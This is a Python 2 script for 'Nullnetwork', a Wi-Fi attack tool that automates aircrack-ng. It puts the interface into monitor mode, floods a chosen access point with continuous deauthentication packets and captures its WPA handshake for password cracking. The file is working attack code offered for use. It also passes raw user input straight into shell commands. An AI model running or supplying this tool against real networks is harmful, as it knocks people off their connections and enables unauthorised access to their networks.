import re
import commands
import os
import time
import sys

class Nullnetwork:


	def __init__(self):
		self.interface = ""
		self.monitor   = ""
		self.bssid     = ""
		self.channel   = ""
		# Colors
		self.BLUE, self.RED, self.WHITE, self.YELLOW, self.MAGENTA, self.GREEN, self.END = '\33[94m', '\033[91m','\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'


	def banner(self):
		sys.stdout.write("""{0}
             __       _ _            _                      _
          /\ \ \_   _| | |_ __   ___| |___      _____  _ __| | __
         /  \/ / | | | | | '_ \ / _ \ __\ \ /\ / / _ \| '__| |/ /
        / /\  /| |_| | | | | | |  __/ |_ \ V  V / (_) | |  |   <{1}
        \_\ \/  \__,_|_|_|_| |_|\___|\__| \_/\_/ \___/|_|  |_|\_|{2}

                        """.format(self.RED, self.BLUE, self.END) + "\n" + " "*20
						+ "{0}Made By: {1}Shady Tantawy {2}(d3db0t){3}".format(
						self.BLUE, self.YELLOW, self.MAGENTA, self.END) + "\n"
						+ " "*20 + "{0}Github: {1}http://github.com/d3db0t{2}".format(self.BLUE, self.YELLOW,
						self.END) + "\n" + " "*20 + "{0}Email: {1}ShadyTantawy@protonmail.com{2}"
						.format(self.BLUE, self.YELLOW, self.END) + "\n")


	def optionBanner(self):
		print "\n{0}Choose an option:{1} \n".format(self.GREEN, self.END)
		print "{0}[{1}1{2}] {3}Attack Broadcast{4}".format(self.YELLOW,
		self.BLUE, self.YELLOW, self.WHITE, self.END) + "\n"
		time.sleep(0.3)
		print "{0}[{1}2{2}] {3}Attack Specific Device{4}".format(self.YELLOW,
		self.BLUE, self.YELLOW, self.WHITE, self.END) + "\n"
		time.sleep(0.3)
		print "{0}[{1}E{2}] {3}Exit{4}".format(self.YELLOW,
		self.BLUE, self.YELLOW, self.WHITE, self.END) + "\n"
		time.sleep(0.3)



	def getInterface(self):
		str = commands.getoutput("ifconfig")
		try:
			i = re.search('(w).*(:)', str).group(0)[:-1]
		except:
			print "{0}No Match Found!{1}".format(self.RED, self.END)
			i = raw_input("Network Interface: ")
		if "mon" in i:
			self.monitor = i
		else:
			self.interface = i


	def killProcess(self):
		print "{0}[+] {1}Killing process...{2}".format(self.YELLOW,
		self.BLUE, self.END),
		try:
			os.system("airmon-ng check kill")
			print "{0}OK{1}".format(self.YELLOW, self.END)
			time.sleep(1)
		except:
			print "{0}Unable to kill process :({1}".format(self.RED, self.END)


	def startAirmon(self):
		try:
			#if self.interface == "":
				#i = raw_input("Network Interface: ")
				#self.interface = i
			os.system("airmon-ng start " + self.interface)
		except:
			print "{0}Airmon failed to start :({1}".format(self.RED, self.END)


	def airodump_ng(self):
		try:
			os.system("airodump-ng " + self.monitor)
		except KeyboardInterrupt:
			print "Exiting Airodump..."


	def getBSSID(self):
		m = "{0}BSSID:{1} ".format(self.GREEN, self.END)
		b = raw_input(m)
		self.bssid = b


	def aireplay_ng(self):
		try:
			os.system("aireplay-ng -0 0 -a " + self.bssid + " " + self.monitor)
		except:
			print "{0}Aireplay failed :({1}".format(self.RED, self.END)


	def getChannel(self):
		ch = "{0}Channel:{1} ".format(self.GREEN, self.END)
		c = raw_input(ch)
		self.channel = c


	def finalAirodump(self):
		try:
			os.system("airodump-ng -c " + self.channel
				+ " --bssid " + self.bssid + " -w psk "
					+ self.monitor)
		except:
			print "{0}Final Airodump failed :({1}".format(self.RED, self.END)
#-------------------------------------------------------

def main():
	N.banner()
	try:
		while True:
			N.optionBanner()
			terminal = "{0}Nullnetwo{1}rk{2}> {3}".format(N.RED, N.BLUE, N.WHITE, N.END)
			choice   = raw_input(terminal)
			if choice == '1':
				attackBroadCast()
			elif choice == 'E':
				raise KeyboardInterrupt
			else:
				os.system("clear")
				print "{0}Please choose a valid option!{1}".format(N.RED, N.END)

	except KeyboardInterrupt:
		print "\n\n{0}Happy Hacking!{1}".format(N.YELLOW, N.END)


def attackBroadCast():
	N.getInterface()
	N.killProcess()
	N.startAirmon()
	N.getInterface()
	N.airodump_ng()
	N.getBSSID()
	N.getChannel()
	N.finalAirodump()
	N.aireplay_ng()


if __name__ == '__main__':
	N = Nullnetwork()
	main()
